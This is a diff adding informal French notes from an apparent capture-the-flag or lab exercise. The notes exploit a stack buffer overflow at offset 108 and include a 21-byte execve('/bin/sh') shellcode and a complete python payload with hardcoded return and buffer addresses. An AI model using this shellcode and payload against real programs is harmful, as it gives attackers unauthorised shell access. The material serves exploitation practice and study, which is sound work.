@@ -1,0 +1,22 @@
+ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrss
+
+on a donc trouver l overflow au niveau de l offset 108
+
+lorsque l on run avec par exemple BBBB ds gdb et qu on afiche lesregistre qu a la ligne +136 il a un cmp avec eax on break et on affiche les registres
+il y a notre chaine ds ecx et le debut du buffer ds eax
+
+notrepayload va donc ressembler a ca
+
+payload : shell_addr + shellcode + padding + buffer_addr
+          [4 bytes]   [21 bytes]  [83 bytes]  [4 bytes] = 108 + 4
+
+le shell code sera a l addresse du buffer + 4 donc 0x804a00c + 4 = 0x804a010.   
+
+sur shellstorm on a ce shell code de 21 bytes 
+
+
+"\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"
+
+
+voici le payload
+python -c 'print "\x10\xa0\x04\x08" + "\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80" + "B" * 83 + "\x0c\xa0\04\x08"'
